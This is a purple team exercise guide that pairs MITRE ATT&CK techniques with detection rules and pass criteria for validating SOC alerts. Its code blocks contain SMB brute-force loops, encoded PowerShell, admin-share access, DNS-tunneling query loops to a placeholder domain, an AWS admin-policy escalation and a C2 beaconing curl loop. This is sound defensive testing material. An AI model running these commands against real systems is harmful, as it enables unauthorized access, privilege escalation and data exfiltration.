# Purple Team Exercise Guide

> **Document ID:** PTX-001  
> **Version:** 1.0  
> **Last Updated:** 2026-02-15  
> **Owner:** Detection Engineering / SOC Manager

---

## Purpose

Validate that your detection rules and playbooks actually work by simulating real-world attack techniques in a controlled environment. Purple teaming bridges the gap between Red Team (attack) and Blue Team (defense).

---

## How It Works

```
Red Team action → SOC should detect → Verify alert fired → Fix if not
```

| Phase | Who | What |
|:---|:---|:---|
| **Plan** | Both teams | Select MITRE techniques to test |
| **Execute** | Red Team | Run controlled attack simulation |
| **Detect** | Blue Team | Monitor for alerts in real-time |
| **Evaluate** | Both teams | Did the detection fire? Correctly? On time? |
| **Improve** | Detection Eng | Tune/create rules for gaps found |

---

## Exercise Catalog — By MITRE ATT&CK

### 🟢 Beginner Exercises

#### EX-01: Phishing Link Click (T1204.001)
**Simulates:** User clicking a phishing link  
**Playbook:** PB-01  
**Sigma Rule:** `proc_office_spawn_powershell`

```bash
# Red Team: Send test phishing email with known-safe tracking link
# Use GoPhish or similar platform
# Target: Test mailbox (not real users)

# Expected Blue Team Detection:
# 1. Email gateway flags the email
# 2. If click → proxy logs show access to known-bad URL category
# 3. If payload → EDR blocks execution
```

**Pass Criteria:**
- [ ] Email gateway detected phishing
- [ ] Proxy blocked the URL
- [ ] Alert created within 5 minutes

---

#### EX-02: Brute Force Login (T1110)
**Simulates:** Password brute force attack  
**Playbook:** PB-04  
**Sigma Rule:** `win_multiple_failed_logins`

```bash
# Red Team: Generate 50 failed logins in 5 minutes
# Linux:
for i in $(seq 1 50); do 
  smbclient //TARGET/share -U "testuser%wrongpass$i" 2>/dev/null
done

# Windows:
1..50 | ForEach { net use \\TARGET\share /user:testuser "wrongpass$_" 2>$null }
```

**Pass Criteria:**
- [ ] SIEM alert fires after threshold (e.g., 10 failures in 5 min)
- [ ] Source IP identified correctly
- [ ] Alert severity = Medium or higher

---

#### EX-03: Suspicious PowerShell (T1059.001)
**Simulates:** Encoded PowerShell execution  
**Playbook:** PB-11  
**Sigma Rule:** `proc_powershell_encoded`

```powershell
# Red Team: Run encoded but BENIGN PowerShell
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "Purple Team Test"'))
powershell.exe -EncodedCommand $cmd
```

**Pass Criteria:**
- [ ] EDR alerts on encoded PowerShell
- [ ] Sysmon Event ID 1 captures command line
- [ ] SIEM correlates with Sigma rule

---

### 🟡 Intermediate Exercises

#### EX-04: Lateral Movement via SMB (T1021.002)
**Simulates:** Admin share access to another host  
**Playbook:** PB-12  
**Sigma Rule:** `win_admin_share_access`

```powershell
# Red Team: Access admin share on target (authorized test account)
net use \\TARGET\C$ /user:DOMAIN\testadmin <password>
dir \\TARGET\C$\Windows\Temp
net use \\TARGET\C$ /delete
```

**Pass Criteria:**
- [ ] Event ID 5140/5145 logged for share access
- [ ] SIEM alert fires for admin share access
- [ ] Source/destination correctly identified

---

#### EX-05: Data Exfiltration via DNS (T1048.003)
**Simulates:** DNS tunneling exfiltration  
**Playbook:** PB-24  
**Sigma Rule:** `net_dns_tunneling`

```bash
# Red Team: Generate high-volume DNS queries with long subdomains
for i in $(seq 1 1000); do
  nslookup $(head -c 60 /dev/urandom | base64 | tr -d '/+=' | head -c 50).test.example.com
done
```

**Pass Criteria:**
- [ ] DNS monitoring detects abnormal query volume
- [ ] Long subdomain queries flagged
- [ ] Alert references DNS tunneling

---

#### EX-06: Shadow Copy Deletion (T1490)
**Simulates:** Pre-ransomware indicator  
**Playbook:** PB-02  

```powershell
# Red Team: Run vssadmin (WILL NOT actually delete in test mode)
# ⚠️ Run on ISOLATED test VM only!
vssadmin list shadows
# Log-only: DO NOT run "delete shadows" on production
# Instead, verify Sysmon detects the vssadmin execution
```

**Pass Criteria:**
- [ ] EDR detects vssadmin execution
- [ ] Process tree shows parent process
- [ ] Alert severity = High or Critical

---

### 🔴 Advanced Exercises

#### EX-07: AiTM / MFA Bypass (T1556.006)
**Simulates:** Adversary-in-the-Middle session theft  
**Playbook:** PB-26  
**Sigma Rule:** `cloud_mfa_bypass`

```
# Red Team: 
# 1. Use Evilginx2 or similar on isolated lab
# 2. Capture session token from test account
# 3. Replay session token from different IP/region

# Expected Detection:
# Azure AD: "Anomalous Token" risk detection
# Impossible travel between token use locations
# Session from unusual client/browser fingerprint
```

**Pass Criteria:**
- [ ] Azure AD risk detection fires
- [ ] SOC identifies token reuse anomaly
- [ ] Session revocation happens within 15 min

---

#### EX-08: Cloud Privilege Escalation (T1078.004)
**Simulates:** IAM privilege escalation in AWS  
**Playbook:** PB-16  

```bash
# Red Team (in test AWS account):
aws iam create-user --user-name purple-test-user
aws iam attach-user-policy --user-name purple-test-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name purple-test-user

# Cleanup:
aws iam detach-user-policy --user-name purple-test-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name purple-test-user
```

**Pass Criteria:**
- [ ] CloudTrail logs IAM changes
- [ ] SIEM alert for admin policy attachment
- [ ] SOC identifies the escalation within 30 min

---

#### EX-09: C2 Beaconing (T1071.001)
**Simulates:** Command and control callbacks  
**Playbook:** PB-13  
**Sigma Rule:** `net_beaconing`

```bash
# Red Team: Simulate periodic callbacks (60-second intervals)
while true; do
  curl -s https://safe-c2-test.example.com/beacon?id=test123 > /dev/null
  sleep $((55 + RANDOM % 10))  # Jitter: 55-65 seconds
done
```

**Pass Criteria:**
- [ ] Network monitoring detects periodic beaconing
- [ ] Regular interval pattern identified
- [ ] Destination flagged for investigation

---

## Results Tracking Template

| Exercise | Technique | Detection? | Time to Detect | Alert Accurate? | Action |
|:---|:---|:---:|:---:|:---:|:---|
| EX-01 | T1204 | ✅ / ❌ | __ min | ✅ / ❌ | [tune/create/OK] |
| EX-02 | T1110 | ✅ / ❌ | __ min | ✅ / ❌ | [tune/create/OK] |
| EX-03 | T1059 | ✅ / ❌ | __ min | ✅ / ❌ | [tune/create/OK] |
| ... | ... | ... | ... | ... | ... |

---

## Safety Rules

> [!CAUTION]
> 1. **NEVER run on production** without written approval and a rollback plan
> 2. **Use isolated test environments** (VMs, lab networks, test cloud accounts)
> 3. **Inform the SOC** that an exercise is happening (or test blind response)
> 4. **Have a kill switch** — ability to stop immediately if something goes wrong
> 5. **Document everything** — timestamped log of all actions taken

---

## Recommended Tools

| Tool | Purpose | License |
|:---|:---|:---|
| [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) | Pre-built MITRE ATT&CK test cases | MIT |
| [Caldera](https://github.com/mitre/caldera) | Automated adversary emulation | Apache 2.0 |
| [Infection Monkey](https://github.com/guardicore/monkey) | Network breach simulation | GPLv3 |
| [Stratus Red Team](https://github.com/DataDog/stratus-red-team) | Cloud attack simulation | Apache 2.0 |
| [GoPhish](https://github.com/gophish/gophish) | Phishing simulation | MIT |

---

## Exercise Calendar

| Frequency | Exercise | Coverage |
|:---:|:---|:---|
| Monthly | 2 Beginner exercises | Core detections |
| Quarterly | 2 Intermediate exercises | Advanced detections |
| Semi-annual | 1 Advanced exercise | Full kill-chain |
| Annual | Full purple team engagement | End-to-end |

---

## Related Documents

- [Tabletop Exercises](Tabletop_Exercises.en.md)
- [Detection Rules Index](../07_Detection_Rules/README.md)
- [MITRE ATT&CK Heatmap](../tools/mitre_attack_heatmap.html)
- [Sigma Rule Validator](../tools/sigma_validator.py)
